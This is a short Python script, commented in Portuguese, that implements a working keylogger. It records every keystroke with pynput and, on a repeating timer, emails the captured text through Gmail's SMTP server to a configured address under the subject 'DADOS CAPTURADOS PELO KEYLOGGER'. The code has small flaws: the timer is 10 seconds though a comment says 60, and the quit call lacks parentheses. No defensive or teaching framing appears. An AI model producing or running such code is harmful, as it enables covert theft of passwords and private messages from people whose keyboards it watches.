from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer
log = " "
#CONFIGURAÇÃO DE EMAIL

email_origem = "SEUEMAIL@SEUEMAIL"
email_destino = "SEUEMAIL@SEUEMAIL"
senha_email = "1234"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = 'DADOS CAPTURADOS PELO KEYLOGGER'
        msg['From'] = email_origem 
        msg['To']= email_destino
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_origem, senha_email)
        server.send_message(msg)
        server.quit
    except Exception as e:
        print('FALHA AO ENVIAR', e)
    
    log = " "

    #AGENDAR O ENVIO A CADA 60 SEGUNDOS
    Timer(10, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass #ignorar ctrl, shift, etc
# Iniciar o keylogger e o envio automatico 
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()

